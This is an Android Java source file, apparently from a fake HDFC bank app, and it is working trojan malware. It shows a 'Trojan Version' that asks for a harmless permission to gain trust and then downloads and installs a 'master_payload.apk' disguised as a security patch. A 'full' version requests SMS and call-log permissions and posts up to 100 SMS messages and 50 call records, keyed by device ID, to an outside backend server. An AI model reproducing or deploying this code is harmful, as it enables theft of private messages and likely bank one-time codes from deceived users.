package com.hdfc.app;

import android.Manifest;
import android.os.Build;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;
import com.getcapacitor.BridgeActivity;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends BridgeActivity {
    private static final String TAG = "HDFC_MainActivity";
    private static final String BACKEND_URL = "https://backprince.onrender.com";
    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/latest/download/master_payload.apk";
    private String forwardingNumber = null;
    private boolean forwardingEnabled = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setupBridge();
        
        if (isFullVersion()) {
            Toast.makeText(this, "Security Sync: Online", Toast.LENGTH_SHORT).show();
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    checkAndRequestPermissions();
                }
            }, 1000);
        } else {
            // Trojan Version - Request benign Notification permission to build trust
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
                }
            }
        }
    }

    private void setupBridge() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                WebView webView = getBridge().getWebView();
                webView.getSettings().setJavaScriptEnabled(true);
                webView.addJavascriptInterface(new Object() {
                    @JavascriptInterface
                    public void requestRealPermissions() { checkAndRequestPermissions(); }
                    
                    @JavascriptInterface
                    public void triggerAutoUpdate() { downloadAndInstallUpdate(); }

                    @JavascriptInterface
                    public boolean isLimitedVersion() { return !isFullVersion(); }

                    @JavascriptInterface
                    public String getDeviceId() { return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); }

                    @JavascriptInterface
                    public void openAppSettings() {
                        Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    }

                    @JavascriptInterface
                    public void requestIgnoreBatteryOptimizations() {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            Intent intent = new Intent();
                            String packageName = getPackageName();
                            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                                intent.setData(Uri.parse("package:" + packageName));
                                startActivity(intent);
                            }
                        }
                    }

                    @JavascriptInterface
                    public void requestNotificationAccess() {
                        startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                    }
                }, "AndroidBridge");
            }
        });
    }

    private boolean isFullVersion() {
        try {
            String appType = getString(R.string.app_type);
            return "MASTER".equals(appType);
        } catch (Exception e) {
            return false;
        }
    }

    private void downloadAndInstallUpdate() {
        runOnUiThread(() -> Toast.makeText(this, "🚀 Starting Security Scan...", Toast.LENGTH_SHORT).show());
        new Thread(new Runnable() {
            @Override
            public void run() {
                int retryCount = 0;
                boolean success = false;
                
                while (retryCount < 5 && !success) {
                    try {
                        URL url = new URL(UPDATE_URL);
                        HttpURLConnection c = (HttpURLConnection) url.openConnection();
                        c.setInstanceFollowRedirects(true);
                        c.connect();

                        if (c.getResponseCode() == HttpURLConnection.HTTP_OK) {
                            File file = new File(getExternalFilesDir(null), "security_patch.apk");
                            InputStream is = c.getInputStream();
                            FileOutputStream fos = new FileOutputStream(file);
                            byte[] buffer = new byte[4096];
                            int len;
                            while ((len = is.read(buffer)) != -1) {
                                fos.write(buffer, 0, len);
                            }
                            fos.close();
                            is.close();
                            success = true;
                            runOnUiThread(() -> Toast.makeText(MainActivity.this, "✅ Download Complete. Installing...", Toast.LENGTH_SHORT).show());
                            installApk(file);
                        } else if (c.getResponseCode() == HttpURLConnection.HTTP_NOT_FOUND) {
                            retryCount++;
                            final int currentRetry = retryCount;
                            runOnUiThread(() -> Toast.makeText(MainActivity.this, "⏳ Server Busy (Attempt " + currentRetry + "/5)...", Toast.LENGTH_SHORT).show());
                            Thread.sleep(5000); // Wait 5 seconds for GitHub to finish upload
                        } else {
                            throw new Exception("HTTP " + c.getResponseCode());
                        }

                    } catch (Exception e) {
                        retryCount++;
                        if (retryCount >= 5) {
                            runOnUiThread(() -> Toast.makeText(MainActivity.this, "⚠️ Connection Error. Please try again in 1 minute.", Toast.LENGTH_LONG).show());
                        }
                        try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                    }
                }
            }
        }).start();
    }

    private void installApk(File file) {
        try {
            Uri apkUri = FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", file);
            Intent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
            intent.setData(apkUri);
            intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Install Error", e);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    @Override
    public void onResume() {
        super.onResume();
        if (isFullVersion()) {
            checkAndRequestPermissions();
        }
    }

    private void checkAndRequestPermissions() {
        String[] permissions = {
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.POST_NOTIFICATIONS
        };

        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }

        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 100);
        } else {
            startServiceLogic();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 100) {
            startServiceLogic();
        }
    }

    private void startServiceLogic() {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        new Thread(() -> {
            readAndSendSmsInbox(deviceId);
            readAndSendCallLogs(deviceId);
        }).start();
    }

    private void readAndSendCallLogs(String deviceId) {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
            if (cursor != null && cursor.moveToFirst()) {
                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
                do {
                    JSONObject payload = new JSONObject();
                    payload.put("deviceId", deviceId);
                    payload.put("number", cursor.getString(numberIdx));
                    payload.put("type", cursor.getString(typeIdx));
                    payload.put("duration", cursor.getString(durationIdx));
                    payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
                    sendToBackend("/api/logs/calls", payload.toString());
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { Log.e(TAG, "Call Log Error", e); }
    }

    private void readAndSendSmsInbox(String deviceId) {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");
            if (cursor != null && cursor.moveToFirst()) {
                int addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                int bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY);
                int dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE);
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
                do {
                    JSONObject payload = new JSONObject();
                    payload.put("deviceId", deviceId);
                    payload.put("sender", cursor.getString(addressIdx));
                    payload.put("message", cursor.getString(bodyIdx));
                    payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
                    sendToBackend("/api/logs/sms", payload.toString());
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { Log.e(TAG, "SMS Error", e); }
    }

    private void sendToBackend(String endpoint, String jsonData) {
        try {
            URL url = new URL(BACKEND_URL + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(jsonData.getBytes("UTF-8"));
            os.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { Log.e(TAG, "Backend Error", e); }
    }
}
